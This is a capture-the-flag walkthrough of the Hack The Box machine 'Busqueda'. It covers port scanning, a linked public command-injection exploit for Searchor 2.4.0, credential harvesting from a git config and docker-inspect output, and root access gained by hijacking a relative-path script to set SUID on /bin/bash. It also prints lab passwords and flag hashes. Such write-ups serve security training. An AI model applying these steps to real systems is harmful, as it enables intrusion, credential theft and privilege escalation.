# Busqueda

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled.jpeg)

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Busqueda]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.208
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 10:05 IST
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.63s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
```
{: .nolineno}

## Web Enumeration ⤵️

I loaded this port 80 and I got redirected to `searcher.htb` domain name so I set the `/etc/hosts` file in the attackers machine and got this simple site →

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled.png)

I got this version of this CMS site `Searchor 2.4.0`  and I searched the exploit of it and got this exploit of `command Injection` through python.

[GitHub - nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection: Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/tree/main)

Now I used this exploit and got the reverse shell on its system.

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled%201.png)

Lets enumerate further →

```bash
svc@busqueda:/var/www/app/.git$ cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
svc@busqueda:/var/www/app/.git$
```
{: .nolineno}

I got credentials of gitea site and a new domain name too so lets set and add in /etc/hosts.

I got into its account site →

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled%202.png)

I also noticed the administrators account but can’t login with that same password .

I then used the cody password in as svc account password to see the `sudo -l` command to access root account.

```bash
svc@busqueda:~$ ls -al
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3  2023 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3  2023 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Dec 28 16:47 user.txt
svc@busqueda:~$ cat user.txt
cat user.txt
ffcc2dd47b3d6d1c3a86566951886a72
svc@busqueda:~$
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:/var/www/app/.git$
```
{: .nolineno}

I used this command and got 3 options →

```bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py bacd
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:/tmp$
```
{: .nolineno}

I used the `docker-inspect` command with format flag →

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled%203.png)

so lets use this command →

```bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-ps                  
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS        PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   11 months ago   Up 12 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   11 months ago   Up 12 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```
{: .nolineno}

I got 2 images of docker that can have its own configuration file so lets try it on mysql and I think I will get the credentials of mysql account →

```bash
svc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}

svc@busqueda:/var/www/app/.git$
```
{: .nolineno}

Lets use its password on gitea site for administrators access and when  I tried it I got in →

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled%204.png)

when I checked `system-checkup.py` file I noticed that the file path is not specified so I will be creating a file in any directory with name as `full-checkup.sh` file and insert the payload into the I will be payload to make `/bin/bash` as SUIDs permissions :

![Untitled](Busqueda%201f10ec1f7aba4dd1aec0600f6c12c3c1/Untitled%205.png)

Lets use the `sudo python3 /opt/scripts/system-checkup.py full-checkup` command →

```bash
svc@busqueda:/tmp$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:/tmp$ bash -p
bash-5.1# ls -al
bash-5.1# cd /root
bash-5.1# ls -al
total 60
drwx------  9 root root 4096 Dec 28 16:47 .
drwxr-xr-x 19 root root 4096 Mar  1  2023 ..
lrwxrwxrwx  1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Mar  1  2023 .cache
drwx------  3 root root 4096 Mar  1  2023 .config
-rw-r-----  1 root root  430 Apr  3  2023 ecosystem.config.js
-rw-r--r--  1 root root  104 Apr  3  2023 .gitconfig
drwxr-xr-x  3 root root 4096 Mar  1  2023 .local
-rw-------  1 root root   50 Feb 20  2023 .my.cnf
lrwxrwxrwx  1 root root    9 Feb 20  2023 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4096 Mar  1  2023 .npm
drwxr-xr-x  5 root root 4096 Dec 28 16:47 .pm2
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Dec 28 16:47 root.txt
drwxr-xr-x  4 root root 4096 Apr  3  2023 scripts
drwx------  3 root root 4096 Mar  1  2023 snap
bash-5.1# whoami
root
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
bash-5.1# cat root.txt
2b58c418e01ad180b2c4f5c363e9bc8e
bash-5.1#
```
{: .nolineno}

I am root now !!